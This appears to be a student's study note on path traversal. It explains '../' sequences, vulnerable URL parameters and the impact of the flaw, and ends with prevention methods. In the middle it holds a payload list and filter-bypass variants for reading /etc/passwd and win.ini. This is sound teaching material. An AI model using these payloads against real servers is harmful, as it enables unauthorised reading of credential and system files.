- Path Traversal (also called Directory Traversal) is a bug in websites where an attacker can trick the site into opening files it should not open.
- ==Attacker manipulates file paths to access files outside the intended (considered) directory.==
- Normally, a site may only allow you to access safe files (like your own uploads). But if the code is careless, an attacker can add special characters to the file path to "climb out" of the allowed folder and peek into other parts of the server.

  Path traversal occurs when:

    - Application uses user input to access files
    - Attacker manipulates the path using ../ sequences
    - Attacker escapes the intended directory
    - Attacker reads sensitive system files


### 🗂 How it works

- `../` means “go up one folder” in a file path. 
- By repeating it (`../../../../`), you can go back multiple folders. 

In file systems:

-    . = Current directory
-    .. = Parent directory (go up one level)

Example:

Website expects:

"`http://example.com/download.php?file=myreport.pdf`"

Attacker tries:

"[http://example.com/download.php?file=../../../../etc/passwd](http://example.com/download.php?file=../../../../etc/passwd)"

📂 This might give access to a system file (like `/etc/passwd` on Linux).

### Absolute Path:

Full path to a file or folder / Complete path from the root of the file system

Starts from the root directory (/ in Linux, drive letter in Windows).

ex: /home/ak/Documents/report.txt(linux)

      C:\Windows\System32\drivers\etc\hosts

## Relative Path

- Path written relative to your current working directory. 
- Shorter and flexible but depends on where you run it from.

      ex: Documents/report.txt   → means /home/ak/Documents/report.txt

## 🔹 In Cybersecurity Context

- Absolute paths are often seen in error messages → can leak server structure (info disclosure).[[4.Information disclosure]] 
- Relative paths are often abused in Path Traversal / LFI attacks:

`../../../../etc/passwd`

→ goes up directories relative to the vulnerable script’s location.

  
  **Directory structure:**
```
/
├── etc
│   ├── passwd         ← Target file!
│   ├── shadow
│   └── hosts
├── var
│   └── www
│       └── html
│           ├── images     ← Application's intended directory
│           │   ├── product1.jpg
│           │   └── product2.jpg
│           └── index.php
└── home
    └── carlos
        └── secret.txt
```

**The traversal path:**

```
Starting point: /var/www/html/images/

../              = /var/www/html/
../../           = /var/www/
../../../        = /var/
../../../../     = /
../../../../etc/passwd = /etc/passwd

SUCCESS! Escaped to read system file!
```

## ⚠️ Impact of Path Traversal

1. Stealing sensitive files
    - Attackers can read files they shouldn’t.
    - Examples:
        - `/etc/passwd` or `/etc/shadow` (Linux user accounts) 
        - `C:\Windows\win.ini` (Windows system info) 
        - Application config files → may contain database usernames/passwords. 

2.   Leaking source code

- Attackers can open the website’s own code files (e.g., `.php`, `.asp`, `.java`). 
- This reveals how the app works and helps them find more weaknesses.   

3.   Finding hidden information

- Error logs, backup files, environment variables.
- These can contain API keys, session tokens, or internal server details.

4.  Stepping stone to bigger attacks

- If the attacker can both read and write files (e.g., via file upload), they may place a webshell or malicious code on the server → leading to Remote Code Execution (RCE).   

## 📂 Parameters vulnerable to Path Traversal

Path Traversal usually happens when parameters are used to handle files. Some common ones:

- `file` → `?file=../../../../etc/passwd` 
- `page` → `?page=../../../../windows/win.ini` 
- `doc` → `?doc=../../../../etc/hosts` 
- `folder` / `dir` → `?dir=../../../../var/log/` 
- `template` → `?template=../../../../config/config.php` 
- `lang` (for language files) → `?lang=../../../../etc/passwd`

**Common vulnerable features:**
- Image loading
- File downloads
- PDF viewers
- Template includes
- Log file viewers
- Report generators
- File editors
- Backup downloads


##  Why parameters matter

- If user input (parameter values) is placed directly into file paths without validation, attackers can insert `../` sequences. 
- This lets them escape the intended folder and read sensitive files.

✅ In short:

- Parameters = inputs in the URL (like `?file=something`). 
- If these parameters are not secured, attackers can exploit them with path traversal payloads.

✅ Summary:

- Path Traversal = accessing files outside allowed directory 
- LFI = including local files on the server 
- RFI = including remote files (can lead to remote code execution)

#### Basic Payloads
```LINUX
 ../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd
/etc/passwd
```

```WINDOWS
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows\win.ini
....\\....\\....\\windows\\win.ini
C:\windows\win.ini
```

### Common Bypass Techniques
#### Bypass 1: Blocked ../ - Use Encoding
    URL Encoding:
    ../    =	%2e%2e%2f


#### Bypass 2: Double Encoding
     ../	  =    %252e%252e%252f

#### Bypass 3: Filter Strips ../ Once
If filter removes ../ only once:

```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..../..../..../etc/passwd
```

#### Bypass 4: Absolute Path
```
/etc/passwd
file:///etc/passwd
```

#### Bypass 5: Required File Extension
```
../../../etc/passwd%00.jpg
../../../etc/passwd\x00.jpg
```

#### Bypass 8: Windows Specific
Using backslashes:

```
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini
```
## Prevention Methods
1. Avoid user input in file paths:
2. Use whitelist of allowed files:
3. Canonicalize and validate path:
4. Remove path separators:

#### 1. Use allowlists for files
- Map user input to predefined filenames
- Do NOT accept raw file paths from users

#### 2. Normalize and validate paths
- Convert input to a canonical path
- Ensure it stays inside an allowed directory
**it blocks:**
```
../
..\
%2e%2e%2f
```

#### 3. Enforce a base directory
- Always prepend a fixed directory
- Reject paths outside it

```kotlin
/var/www/data/ + user_input
```

#### 4. Use file system permissions
Web server user:
    - Read only what is necessary
    - No access to sensitive files

Even if traversal works → access denied

#### 5. Avoid dynamic file includes
**Do not Use:**
```
include($_GET['file']);
```

Why it works
    - Dynamic includes are high-risk
    - Common source of LFI/RFI

#### 6. Disable error messages

Hide full file paths in errors.
